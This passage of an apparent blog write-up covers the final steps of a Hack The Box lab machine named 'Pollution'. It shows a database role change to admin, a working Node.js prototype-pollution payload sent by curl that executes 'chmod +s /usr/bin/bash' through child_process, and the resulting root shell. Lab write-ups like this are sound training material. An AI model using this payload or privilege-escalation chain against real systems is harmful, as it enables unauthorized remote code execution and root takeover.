+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">Status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Ok&#34;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">Status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Error&#34;</span>, <span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Parameter text not found&#34;</span>});
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>For more background on the exploit, refer to: <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation</a></li>
+<li>So, for our exploit, we need to authentication against the API as an admin user and then craft a malicious polluted payload to get RCE.</li>
+<li>Remember we registered a user for API access at <code>developers.collect.htb</code>? this is where we will use it.</li>
+<li>The users for API access are stored in <code>pullution_api</code> db, this can be found by reading <code>pollution_api/models/db.js</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">Sequelize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;sequelize&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sequelize</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Sequelize</span>(<span style="color:#e6db74">&#39;pollution_api&#39;</span>,<span style="color:#e6db74">&#39;webapp_user&#39;</span>,<span style="color:#e6db74">&#39;S******************1&#39;</span>,{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dialect</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;mysql&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">charset</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;utf8&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">collate</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">timestamps</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">logging</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">Sequelize</span>, <span style="color:#a6e22e">sequelize</span> };
+</span></span></code></pre></div><ul>
+<li>Login to <code>pollution_api</code> db and change user role to <code>admin</code></li>
+</ul>
+<pre tabindex="0"><code>victor@pollution:~$ mysql -u webapp_user -p&#39;S******************1&#39; -D pollution_api
+
+MariaDB [pollution_api]&gt; show tables;
++-------------------------+
+| Tables_in_pollution_api |
++-------------------------+
+| messages                |
+| users                   |
++-------------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [pollution_api]&gt; select * from users;
++----+----------+----------+------+---------------------+---------------------+
+| id | username | password | role | createdAt           | updatedAt           |
++----+----------+----------+------+---------------------+---------------------+
+|  1 | meow     | test123  | user | 2022-12-04 20:37:37 | 2022-12-04 20:37:37 |
++----+----------+----------+------+---------------------+---------------------+
+1 rows in set (0.001 sec)
+
+MariaDB [pollution_api]&gt; update users set role=&#39;admin&#39;;
+Query OK, 1 rows affected (0.001 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+</code></pre><ul>
+<li>Now, we can login with <code>meow</code> and receive a token that has <code>admin</code> privilege and exploit the <code>/admin/messages/send</code> API.</li>
+</ul>
+<pre tabindex="0"><code># login as meow and receive a token
+&gt; curl http://127.0.0.1:3000/auth/login -H &#34;content-type: application/json&#34; -d &#39;{&#34;username&#34;:&#34;meow&#34;,&#34;password&#34;:&#34;test123&#34;}&#39;
+{&#34;Status&#34;:&#34;Ok&#34;,&#34;Header&#34;:{&#34;x-access-token&#34;:&#34;&lt;token&gt;&#34;}}
+
+# send a polluted payload to get code execution
+# in here, we executed: chmod +s /usr/bin/bash
+&gt; curl http://127.0.0.1:3000/admin/messages/send -H &#34;x-access-token: &lt;token&gt;&#34; -H &#34;content-type: application/json&#34; -d &#39;{&#34;text&#34;:{&#34;constructor&#34;:{&#34;prototype&#34;:{&#34;shell&#34;:&#34;/proc/self/exe&#34;,&#34;argv0&#34;:&#34;console.log(require(\&#34;child_process\&#34;).execSync(\&#34;chmod +s /usr/bin/bash\&#34;).toString())//&#34;,&#34;NODE_OPTIONS&#34;:&#34;--require /proc/self/cmdline&#34;}}}}&#39;
+</code></pre><ul>
+<li>Prompt to root shell and get root flag</li>
+</ul>
+<pre tabindex="0"><code>victor@pollution:~$ ls -ls /usr/bin/bash
+1208 -rwsr-sr-x 1 root root 1234376 Mar 27  2022 /usr/bin/bash
+victor@pollution:~$ bash -p
+bash-5.1# cat /root/root.txt
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
